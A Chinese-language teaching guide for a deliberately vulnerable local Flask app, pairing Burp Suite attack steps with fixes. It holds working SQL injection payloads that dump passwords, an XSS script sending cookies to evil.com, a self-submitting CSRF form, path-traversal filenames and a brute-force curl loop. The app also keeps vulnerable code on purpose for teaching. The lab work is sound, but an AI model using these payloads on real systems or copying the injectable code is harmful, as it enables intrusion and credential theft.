# 用户管理系统 — 安全测试与防御指南

> **关联工具**: Burp Suite 渗透测试平台  
> **测试目标**: http://localhost:5000  
> **漏洞类型**: SQL注入 / 存储型XSS / CSRF / IDOR / 路径穿越 / 暴力破解

---

## 一、Burp Suite 基础配置

### 1.1 浏览器代理设置

```
Burp Suite Proxy 监听地址: 127.0.0.1:8080
浏览器代理设置:        HTTP/HTTPS → 127.0.0.1:8080
```

### 1.2 安装 CA 证书（拦截 HTTPS）

```
Burp Suite → Proxy → Options → Import/Export CA Certificate
浏览器访问 http://burpsuite → 下载证书 → 导入受信任的根证书颁发机构
```

### 1.3 本项目无需 HTTPS

由于本项目运行在 `http://localhost:5000`，只需要设置 HTTP 代理即可，无需安装 CA 证书。

---

## 二、SQL 注入攻击与防御

### 2.1 漏洞位置

本系统共有 **4 个 SQL 注入点**，全部使用 f-string 拼接用户输入：

```python
# 注入点 1 — 搜索（app.py 第 92 行）
sql = f"SELECT ... WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"

# 注入点 2 — 搜索路由（app.py 第 187 行）
sql = f"SELECT ... WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"

# 注入点 3 — 注册（app.py 第 202 行）
sql = f"INSERT INTO users VALUES ('{username}', '{password}', '{email}', '{phone}')"

# 注入点 4 — 个人中心（app.py 第 340 行）
sql = f"SELECT ... FROM users WHERE id = {user_id}"
```

### 2.2 攻击方法

#### 手法 1：布尔盲注（搜索框）

```
正常请求:
  GET /search?keyword=alice  →  返回 alice 的记录

OR 永真注入:
  GET /search?keyword=' OR 1=1 --
  生成 SQL: WHERE username LIKE '%' OR 1=1 --%' OR ...
  效果: 返回所有用户

OR 永假注入:
  GET /search?keyword=' OR 1=2 --
  效果: 无返回结果（用于对比判断）
```

#### 手法 2：UNION 查询注入（搜索框）

```
步骤 1: 探测列数
  keyword=' UNION SELECT 1,2,3,4 --
  生成 SQL: SELECT ... UNION SELECT 1,2,3,4 -- ...
  效果: 页面出现 1,2,3,4 → 确认 4 列

步骤 2: 爆数据库版本
  keyword=' UNION SELECT 1,sqlite_version(),3,4 FROM users --

步骤 3: 爆所有表名
  keyword=' UNION SELECT 1,group_concat(tbl_name),3,4 FROM sqlite_master
          WHERE type='table' --

步骤 4: 🔥 爆所有密码
  keyword=' UNION SELECT 1,group_concat(username||':'||password),3,4 FROM users --
```

#### 手法 3：INSERT 注入（注册功能）

```
正常注册:
  POST /register
  username=bob&password=pass123&email=b@b.com&phone=138

注入注册（闭合 VALUES，注释后面）:
  POST /register
  username=hacker')--

  生成 SQL: INSERT INTO users VALUES ('hacker')--', 'pass', '', '')
                                           ↑        ↑
                                     闭合 VALUES  注释掉后面

批量注册:
  username=a'),('b'),('c
  生成 SQL: INSERT INTO users VALUES ('a'),('b'),('c', 'pass', '', '')
```

#### 手法 4：数字型注入（个人中心）

```
正常请求:
  GET /profile?user_id=1  →  显示 admin 资料

UNION 注入:
  GET /profile?user_id=1 UNION SELECT 2,3,4,5,6
  生成 SQL: SELECT ... WHERE id = 1 UNION SELECT 2,3,4,5,6
```

### 2.3 Burp Suite 联动测试

```
1. 浏览器代理 → Burp Suite → 拦截请求
2. 发送到 Repeater（Ctrl+R）
3. 修改参数测试注入

Repeater 测试步骤：
  ┌────────────────────────────────────────────┐
  │ GET /search?keyword=alice  HTTP/1.1        │
  │ Host: localhost:5000                       │
  │ Cookie: session=xxx                        │
  └────────────────────────────────────────────┘
  
  修改为:
  ┌────────────────────────────────────────────┐
  │ GET /search?keyword=' OR 1=1 --  HTTP/1.1  │
  └────────────────────────────────────────────┘
  
  Intruder 批量测试:
  ┌────────────────────────────────────────────┐
  │ 载荷位置: keyword=§§                       │
  │ 载荷列表:                                  │
  │   ' OR '1'='1                              │
  │   ' OR 1=1 --                               │
  │   ' UNION SELECT 1,2,3,4 --                 │
  │   ' AND 1=1 --                              │
  │   admin' --                                 │
  └────────────────────────────────────────────┘
```

### 2.4 防御方案

```python
# ❌ 错误写法（有注入）
sql = f"SELECT * FROM users WHERE username = '{keyword}'"
c.execute(sql)

# ✅ 正确写法（参数化查询）
sql = "SELECT * FROM users WHERE username LIKE ?"
c.execute(sql, (f"%{keyword}%",))

# ✅ 注册参数化
sql = "INSERT INTO users (username, password) VALUES (?, ?)"
c.execute(sql, (username, password))

# ✅ 数字型参数化
sql = "SELECT * FROM users WHERE id = ?"
c.execute(sql, (user_id,))
```

**原理**: 参数化查询将用户输入视为**数据**而非 SQL 代码，数据库引擎会对参数进行转义处理，无论输入什么特殊字符都不会破坏 SQL 语法结构。

---

## 三、存储型 XSS 攻击与防御

### 3.1 漏洞位置

```
上传功能: POST /upload → 文件保存到 static/uploads/
```

### 3.2 攻击方法

```
1. 构造恶意 HTML 文件:
   <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

2. 上传文件:
   POST /upload
   Content-Type: multipart/form-data
   file=evil.html（包含上述脚本）

3. 访问上传的文件:
   GET /static/uploads/evil.html
   → 浏览器解析 HTML → JS 执行 → Cookie 被窃取
```

### 3.3 Burp Suite 联动测试

```
1. 拦截上传请求
   ┌────────────────────────────────────────────┐
   │ POST /upload HTTP/1.1                      │
   │ Content-Type: multipart/form-data; boundary│
   │                                             │
   │ --boundary                                  │
   │ Content-Disposition: file; filename="xss.htm│
   │ Content-Type: text/html                     │
   │                                             │
   │ <script>alert(1)</script>                   │
   │ --boundary--                                │
   └────────────────────────────────────────────┘

2. Repeater 修改 filename 和 Content-Type
3. 验证上传后访问是否能执行
4. Intruder 可批量测试不同文件扩展名
```

### 3.4 防御方案

```python
# ✅ 方案 1：检测 HTML 扩展名，重命名为 .txt
ext = os.path.splitext(filename)[1].lower()
if ext in [".html", ".htm", ".shtml", ".xhtml", ".svg"]:
    filename = filename + ".txt"

# ✅ 方案 2：强制下载而非解析
response.headers["Content-Disposition"] = "attachment"

# ✅ 方案 3：X-Content-Type-Options 防止 MIME 嗅探
response.headers["X-Content-Type-Options"] = "nosniff"
```

---

## 四、CSRF 攻击与防御

### 4.1 漏洞位置（修复前）

```
所有 POST 表单均无 CSRF Token:
  POST /login      → 可被伪造登录
  POST /register   → 可被伪造注册
  POST /upload     → 可被伪造上传
  POST /recharge   → 可被伪造充值
```

### 4.2 攻击方法

```html
<!-- 攻击者构造的恶意页面 -->
<html>
<body>
  <h1>免费抽奖！点击领取</h1>
  <form action="http://localhost:5000/recharge" method="POST" id="f">
    <input type="hidden" name="user_id" value="1">
    <input type="hidden" name="amount" value="-99999">
  </form>
  <script>document.getElementById('f').submit()</script>
</body>
</html>
```

受害者只要访问这个页面，浏览器会自动向 `/recharge` 发送 POST 请求（附带受害者的 cookie），导致余额被扣除。

### 4.3 Burp Suite 联动测试

```
1. 生成 CSRF POC:
   Burp Suite → Engagement Tools → Generate CSRF PoC

2. 测试 CSRF 漏洞:
   复制生成的 HTML → 保存为 .html 文件 → 在浏览器打开
   观察请求是否被服务器接受

3. 验证修复:
   有 CSRF Token 的请求必须携带正确 Token
   无 Token → 服务器返回错误
```

### 4.4 防御方案

```python
# 1. GET 请求生成 Token
if "csrf_token" not in session:
    session["csrf_token"] = secrets.token_hex(16)

# 2. POST 请求验证 Token
@app.route("/recharge", methods=["POST"])
def recharge():
    csrf_token = request.form.get("csrf_token", "")
    if csrf_token != session.get("csrf_token"):
        return "CSRF 验证失败"

# 3. 模板中添加隐藏字段
<form method="post" action="/recharge">
    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
    ...
</form>
```

---

## 五、水平越权 IDOR 攻击与防御

### 5.1 漏洞位置

```python
# 个人中心：直接使用 URL 参数查询，不从 session 获取
@app.route("/profile")
def profile():
    user_id = request.args.get("user_id", "")
    sql = f"SELECT * FROM users WHERE id = {user_id}"
```

### 5.2 攻击方法

```
GET /profile?user_id=1  →  查看 admin 资料
GET /profile?user_id=2  →  查看 alice 资料
GET /profile?user_id=3  →  查看其他用户资料

无需登录，无需权限，直接修改 URL 中的数字即可遍历所有用户
```

### 5.3 Burp Suite 联动测试

```
1. 拦截请求:
   GET /profile?user_id=1

2. 发送到 Intruder:
   载荷位置: user_id=§1§
   载荷类型: Numbers（1-100）
   观察响应长度变化 → 判断哪些 ID 存在

3. Repeater 手动测试:
   依次修改 user_id=2,3,4,5...
   对比返回内容的差异
```

### 5.4 防御方案

```python
# ✅ 从 session 获取当前用户身份，不从 URL 参数获取
@app.route("/profile")
def profile():
    username = session.get("username")
    if not username:
        return redirect("/login")
    # 通过 username 查询当前用户的资料
    sql = "SELECT * FROM users WHERE username = ?"
    c.execute(sql, (username,))

# 或者：验证当前用户是否有权访问
@app.route("/profile")
def profile():
    username = session.get("username")
    user_id = request.args.get("user_id", "")
    sql = "SELECT * FROM users WHERE id = ? AND username = ?"
    c.execute(sql, (user_id, username))
```

---

## 六、路径穿越攻击与防御

### 6.1 漏洞位置（修复前）

```python
filename = file.filename  # ../../evil.txt
filepath = os.path.join(upload_dir, filename)
file.save(filepath)  # 保存到 uploads/../../evil.txt → 写到了上层目录
```

### 6.2 攻击方法

```
上传请求:
  POST /upload
  filename = ../../evil.txt
  → 文件实际保存到 project/evil.txt（逃逸了 uploads 目录）

进阶攻击:
  filename = ../../app.py            → 覆盖源码
  filename = ../../templates/xxx.html → 篡改页面
  filename = ../../../../etc/cron.d/evil → Linux 定时任务
```

### 6.3 Burp Suite 联动测试

```
1. 拦截上传请求，修改 filename:
   ┌────────────────────────────────────────────┐
   │ Content-Disposition: form-data;            │
   │   name="file"; filename="../../evil.txt"   │
   └────────────────────────────────────────────┘

2. 查看响应是否提示上传成功
3. 访问 /static/uploads/evil.txt 和 /evil.txt 对比位置
```

### 6.4 防御方案

```python
# ✅ 只取文件名部分，丢弃目录路径
filename = os.path.basename(file.filename)
# ../../evil.txt → evil.txt
```

---

## 七、暴力破解攻击与防御

### 7.1 漏洞位置（修复前）

```python
@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    # 无频率限制，每秒可发送数百次请求
```

### 7.2 攻击方法

```bash
# 批量尝试密码
for pass in admin123 admin1234 123456 password;
do
  curl -X POST http://localhost:5000/login \
    -d "username=admin&password=$pass"
done
```

### 7.3 Burp Suite 联动测试

```
1. 拦截登录请求 → 发送到 Intruder

2. 设置载荷位置:
   ┌────────────────────────────────────────────┐
   │ POST /login HTTP/1.1                       │
   │ Host: localhost:5000                        │
   │                                             │
   │ username=admin&password=§§                  │
   └────────────────────────────────────────────┘

3. 载荷类型: Simple list
   载荷列表: 常见密码字典

4. 观察响应长度:
   密码错误 → 返回长度 1446（登录页 + 错误提示）
   密码正确 → 返回长度 2392（首页 + 用户信息）

5. 攻击完成后按响应长度排序 → 长度不同的即为正确密码
```

### 7.4 防御方案

```python
# 登录频率限制：同一 IP 10 秒内最多 5 次
LOGIN_ATTEMPTS = {}

def check_login_rate_limit(ip):
    now = time.time()
    if ip in LOGIN_ATTEMPTS:
        LOGIN_ATTEMPTS[ip] = [t for t in LOGIN_ATTEMPTS[ip] if now - t < 10]
        if len(LOGIN_ATTEMPTS[ip]) >= 5:
            return False
        LOGIN_ATTEMPTS[ip].append(now)
    else:
        LOGIN_ATTEMPTS[ip] = [now]
    return True
```

---

## 八、Burp Suite 完整测试流程

### 8.1 测试前准备

```
1. 启动目标应用:
   cd /workspace/user-management && python app.py

2. 启动 Burp Suite:
   java -jar burpsuite.jar

3. 浏览器设置代理 127.0.0.1:8080
4. 访问 http://localhost:5000
```

### 8.2 各模块测试步骤

| 功能模块 | Burp 工具 | 测试内容 |
|---------|-----------|---------|
| **登录** | Intruder + Repeater | 暴力破解、SQL注入、CSRF |
| **注册** | Repeater + Intruder | INSERT注入、批量注册 |
| **搜索** | Repeater | UNION注入、布尔盲注 |
| **上传** | Repeater | 存储型XSS、路径穿越 |
| **个人中心** | Intruder + Repeater | IDOR遍历用户、数字型注入 |
| **充值** | CSRF PoC Generator | CSRF伪造、负值充值 |

### 8.3 Intruder 攻击类型速查

```
Sniper（狙击手）:
  一个载荷位置，逐个测试
  适用: 密码破解（逐个尝试密码）

Battering ram（攻城槌）:
  多个位置使用相同载荷
  适用: 同时修改 username 和 password

Pitchfork（草叉）:
  多个位置使用不同载荷列表
  适用: 同时测试不同的用户名和密码组合

Cluster bomb（集束炸弹）:
  多个位置的所有组合
  适用: 穷举所有用户名×密码组合
```

### 8.4 响应分析技巧

```python
# 通过响应长度判断注入结果
正常请求:         721 bytes
'1'='1（真）:    721 bytes  ← 与正常相同
'1'='2（假）:    670 bytes  ← 不同

SQL语法错误:      830+ bytes  ← 包含错误信息
登录成功:         2392 bytes  ← 包含用户信息
登录失败:         1446 bytes  ← 只有登录页
页面不存在:       404
WAF拦截:          403
```

---

## 九、漏洞全景图

```
                    ┌──────────────────────┐
                    │    用户管理系统       │
                    │   localhost:5000      │
                    └──────────┬───────────┘
                               │
            ┌──────────────────┼──────────────────┐
            │                  │                  │
       ┌────┴────┐       ┌────┴────┐       ┌────┴────┐
       │  认证    │       │  数据    │       │  文件    │
       │  模块    │       │  模块    │       │  模块    │
       └────┬────┘       └────┬────┘       └────┬────┘
            │                  │                  │
    ┌───────┼───────┐  ┌──────┼──────┐  ┌───────┼───────┐
    │               │  │             │  │               │
  登录            注册 搜索        个人中心 上传         充值
    │               │  │             │  │               │
  暴力破解       INSERT  UNION      IDOR  存储型XSS    CSRF
  CSRF          注入   注入         SQL注入 路径穿越     负值注入
```

---

## 十、防御体系总览

### 已实施的防御措施

| 措施 | 保护对象 | 实现方式 |
|------|---------|---------|
| CSRF Token | 登录/注册/上传/充值 | `secrets.token_hex(16)` + session 验证 |
| 登录频率限制 | 登录接口 | 同一 IP 10秒/5次 |
| 路径穿越防护 | 上传接口 | `os.path.basename()` |
| XSS 防护 | 上传接口 | HTML 文件重命名为 .txt |
| 安全响应头 | 全站 | `X-Frame-Options` / `X-Content-Type-Options` |
| 密码哈希 | 登录 | `werkzeug.security` 哈希比对 |

### 未实施（故意保留供教学）

| 漏洞 | 位置 | 攻击方式 |
|------|------|---------|
| SQL 注入 | 搜索/注册/个人中心 | f-string 拼接 |
| 水平越权 IDOR | 个人中心 | URL 参数 user_id |
| 负值充值 | 充值接口 | amount=-99999 |
| 未授权访问 | 个人中心 | 无需登录 |

---

*本文档配合 Burp Suite 使用，适用于 Web 安全课程实验教学*  
*项目地址: https://github.com/renegade-blast/web-homework77*
